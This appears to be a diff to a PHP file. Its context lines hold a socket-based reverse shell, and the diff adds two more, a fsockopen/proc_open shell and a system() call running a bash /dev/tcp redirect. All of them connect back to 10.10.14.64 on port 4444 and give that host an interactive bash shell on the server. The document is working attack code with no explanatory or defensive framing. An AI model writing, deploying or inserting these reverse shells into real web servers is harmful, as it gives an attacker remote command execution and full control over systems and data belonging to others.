@@ -10,3 +10,14 @@ if (socket_connect($sock, $ip, $port) === false) {
 }
 $pipe = proc_open('/bin/bash', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
 ?>
+
+
+<?php
+// Simple one-liner PHP Reverse Shell
+$ip = '10.10.14.64';
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/bash', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
+?>
+
+<?php system('bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'); ?>
